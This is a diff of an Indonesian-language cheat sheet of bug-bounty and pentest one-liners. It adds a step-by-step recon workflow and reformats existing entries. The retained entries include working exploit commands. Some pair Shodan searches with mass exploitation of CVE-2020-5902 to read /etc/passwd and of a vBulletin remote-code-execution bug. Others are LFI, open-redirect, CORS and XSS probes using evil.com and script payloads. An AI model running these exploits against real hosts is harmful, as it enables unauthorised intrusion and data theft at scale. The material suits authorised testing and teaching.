@@ -7,6 +7,7 @@ Kumpulan one-liner berikut ini adalah skrip singkat yang sangat berguna untuk ot
 ## Daftar Isi
 
 - [Definisi Placeholder](#definisi-placeholder)
+- [One-liner Workflow Lengkap (Step by Step)](#one-liner-workflow-lengkap-step-by-step) ← **NEW**
 - [One-liner dan Penjelasan](#one-liner-dan-penjelasan)
   - [1. Local File Inclusion (LFI)](#1-local-file-inclusion-lfi)
   - [2. Open Redirect](#2-open-redirect)
@@ -53,6 +54,69 @@ Kumpulan one-liner berikut ini adalah skrip singkat yang sangat berguna untuk ot
 
 ---
 
+## One-liner Workflow Lengkap (Step by Step)
+
+Berikut adalah alur kerja bug bounty/penetration test mulai dari subdomain enumeration hingga vulnerability scanning, cocok untuk pemula maupun intermediate.
+
+```bash
+# 1. Subdomain Enumeration
+subfinder -d target.com -silent > subs.txt
+
+# 2. Check live domains
+cat subs.txt | httpx -silent -status-code -title -tech-detect > live.txt
+
+# 3. Collect URLs (Wayback + GAU)
+cat subs.txt | waybackurls > wayback.txt
+cat subs.txt | gau --blacklist jpg,png,css,woff > gau.txt
+cat wayback.txt gau.txt | sort -u > all_urls.txt
+
+# 4. Filter URLs with parameters
+cat all_urls.txt | grep "=" | sort -u > params.txt
+
+# 5. Find XSS parameters (gf)
+cat params.txt | gf xss > xss_candidates.txt
+
+# 6. Test XSS (dalfox)
+dalfox file xss_candidates.txt -o xss_result.txt
+
+# 7. Directory Bruteforce (ffuf)
+ffuf -u https://target.com/FUZZ -w ~/wordlists/common.txt -mc 200,403 -t 50
+
+# 8. Subdomain Bruteforce (dnsx)
+dnsx -d target.com -w ~/wordlists/subdomains.txt -silent -a -resp
+
+# 9. OOB Interaction (interactsh)
+interactsh-client | tee interact.txt
+
+# 10. Nuclei scanning
+cat live.txt | nuclei -t vulnerabilities/ -o nuclei_result.txt
+```
+
+**Penjelasan Step by Step:**
+
+1. **Subdomain Enumeration:**  
+   Cari semua subdomain milik target.
+2. **Check Live Domains:**  
+   Cek subdomain mana saja yang aktif, status code, title, dan teknologi.
+3. **Collect URLs:**  
+   Kumpulkan semua URL dari subdomain menggunakan waybackurls dan gau.
+4. **Filter URLs with parameters:**  
+   Filter hanya URL yang punya parameter (ada '=').
+5. **Find XSS parameters:**  
+   Identifikasi parameter yang berpotensi XSS dengan gf.
+6. **Test XSS:**  
+   Uji parameter terhadap XSS secara otomatis dengan dalfox.
+7. **Directory Bruteforce:**  
+   Bruteforce folder/file sensitif di target dengan wordlist.
+8. **Subdomain Bruteforce:**  
+   Bruteforce subdomain dengan wordlist.
+9. **OOB Interaction:**  
+   Siapkan listener untuk bug OOB (Out-of-Band) seperti SSRF, XXE dengan Interactsh.
+10. **Nuclei scanning:**  
+    Scanning otomatis menggunakan template vulnerabilities nuclei.
+
+---
+
 ## One-liner dan Penjelasan
 
 ### 1. Local File Inclusion (LFI)
@@ -61,9 +125,10 @@ Kumpulan one-liner berikut ini adalah skrip singkat yang sangat berguna untuk ot
 gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mencari URL yang rentan LFI, mengganti parameter menjadi `/etc/passwd`, lalu cek apakah file tersebut bisa dibaca oleh server.
-- **Cara pakai:**  
+- **Cara pakai:**
   - Install: gau, gf, qsreplace, curl.
   - Jalankan: `gau example.com | gf lfi | qsreplace "/etc/passwd" | xargs ...`
   - Hasil: Jika ada output "VULN! <url>", berarti LFI ditemukan.
@@ -76,9 +141,10 @@ gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"
 export LHOST="https://evil.com"; gau HOST | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mencari parameter redirect, mengganti value menjadi domain luar, lalu cek apakah server melakukan redirect ke domain tersebut.
-- **Cara pakai:**  
+- **Cara pakai:**
   - Set LHOST: `export LHOST="https://evil.com"`
   - Jalankan: `gau example.com | gf redirect ...`
   - Hasil: URL yang rentan open redirect.
@@ -91,9 +157,10 @@ export LHOST="https://evil.com"; gau HOST | gf redirect | qsreplace "$LHOST" | x
 waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengumpulkan parameter yang berpotensi XSS, lalu diuji dengan dalfox menggunakan payload otomatis.
-- **Cara pakai:**  
+- **Cara pakai:**
   - Ganti `YOURS.xss.ht` dengan domain burp collaborator/XSS hunter-mu.
   - Jalankan seperti di atas.
 
@@ -105,9 +172,10 @@ waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.
 subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" :""'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan subdomain, cek URL, lalu uji parameter `__proto__` untuk mendeteksi prototype pollution di JS.
-- **Cara pakai:**  
+- **Cara pakai:**
   - Install: subfinder, httpx, anew, page-fetch.
 
 ---
@@ -115,13 +183,15 @@ subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt &
 ### 5. CVE Exploits
 
 Contoh: **CVE-2020-5902**
+
 ```bash
 shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q "root:x" && echo "[VULNERABLE] $host"; done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mencari target rentan di Shodan, lalu uji exploit CVE sesuai payload.
-- **Cara pakai:**  
+- **Cara pakai:**
   - Pastikan punya akses Shodan CLI dan API key.
 
 ---
@@ -132,7 +202,8 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("id");exit;' | grep uid && echo "[VULNERABLE] $host"; done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Eksploitasi RCE pada vBulletin dengan payload khusus.
 
 ---
@@ -143,7 +214,8 @@ shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " 
 assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep "\.js" | sort -u
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengumpulkan semua file JS dari domain dan subdomain.
 
 ---
@@ -154,7 +226,8 @@ assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.
 cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan endpoint/route tersembunyi dalam file JS.
 
 ---
@@ -165,7 +238,8 @@ cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' |
 for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | uniq); done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mendapatkan info jaringan dan organisasi dari daftar hostname.
 
 ---
@@ -173,19 +247,25 @@ for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois
 ### 10. Get Subdomains (Dari Berbagai Sumber)
 
 **RapidDNS.io**
+
 ```bash
 export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1#result" | grep -e "<td>.*$host</td>" | grep -oP '(?<=<td>)[^<]+' | sort -u
 ```
+
 **BufferOver.run**
+
 ```bash
 curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
 ```
+
 **crt.sh**
+
 ```bash
 curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengumpulkan subdomain dari sumber publik (RapidDNS, BufferOver, crt.sh, dll).
 
 ---
@@ -196,7 +276,8 @@ curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 
 ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Melakukan bruteforce subdomain menggunakan wordlist di FILE.txt.
 
 ---
@@ -207,7 +288,8 @@ ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
 whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan range IP dari ASN berdasarkan IP.
 
 ---
@@ -218,7 +300,8 @@ whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep o
 grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Ekstrak semua IP address dari file teks.
 
 ---
@@ -229,7 +312,8 @@ grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0
 subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Scan port pada subdomain yang tidak pakai CloudFlare.
 
 ---
@@ -240,7 +324,8 @@ subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 4
 gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Membuat wordlist custom dari parameter dan path URL.
 
 ---
@@ -251,7 +336,8 @@ gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -
 for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/[",]//g'; done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengambil info penting (juicy) dari OTX Alienvault berdasarkan hostname.
 
 ---
@@ -262,7 +348,8 @@ for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicato
 subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 -o OUT.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Deteksi peluang subdomain takeover dari hasil enumerasi subdomain.
 
 ---
@@ -273,7 +360,8 @@ subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -nor
 cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengumpulkan URL dengan parameter menggunakan ParamSpider.
 
 ---
@@ -284,7 +372,8 @@ cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
 cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengecek status HTTP banyak URL secara paralel.
 
 ---
@@ -292,11 +381,13 @@ cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_dow
 ### 20. Dump In-scope Assets dari Bug Bounty List
 
 **HackerOne:**
+
 ```bash
 curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengambil daftar asset dari program bug bounty populer.
 
 ---
@@ -307,7 +398,8 @@ curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hacker
 curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengambil seluruh URL dari sitemap.xml untuk recon endpoint.
 
 ---
@@ -318,7 +410,8 @@ curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's
 curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan link dari halaman web lalu mencari endpoint di file JS-nya.
 
 ---
@@ -329,7 +422,8 @@ curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep "
 curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan endpoint API dari file swagger.json.
 
 ---
@@ -340,7 +434,8 @@ curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
 site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then echo "[Potentional CORS Found] $url"; else echo "Nothing on $url"; fi; done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengecek apakah server mengizinkan CORS dari origin sembarangan.
 
 ---
@@ -348,10 +443,11 @@ site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https:/
 ### 25. Find Hidden Servers & Admin Panels
 
 ```bash
-ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
+ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Fuzzing Host header untuk menemukan admin panel/hidden server.
 
 ---
@@ -362,7 +458,8 @@ ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt
 curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jq .[].domain
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mendapatkan domain dari API recon.dev.
 
 ---
@@ -373,7 +470,8 @@ curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jq .[].do
 subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Menemukan subdomain yang benar-benar live/aktif.
 
 ---
@@ -384,7 +482,8 @@ subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/'
 waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Cek XSS tanpa bantuan tool gf, langsung inject payload ke parameter.
 
 ---
@@ -395,7 +494,8 @@ waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while re
 python3 hosthunter.py HOSTS.txt > OUT.txt
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengumpulkan subdomain berdasarkan IP (menggunakan hosthunter.py).
 
 ---
@@ -406,7 +506,8 @@ python3 hosthunter.py HOSTS.txt > OUT.txt
 curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Mengambil domain dari header CSP untuk mencari asset tersembunyi.
 
 ---
@@ -417,7 +518,8 @@ curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0
 nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
 ```
 
-**Penjelasan:**  
+**Penjelasan:**
+
 - Scan port dengan nmap, parse hasilnya, lalu probe port HTTP(S) terbuka secara otomatis.
 
 ---
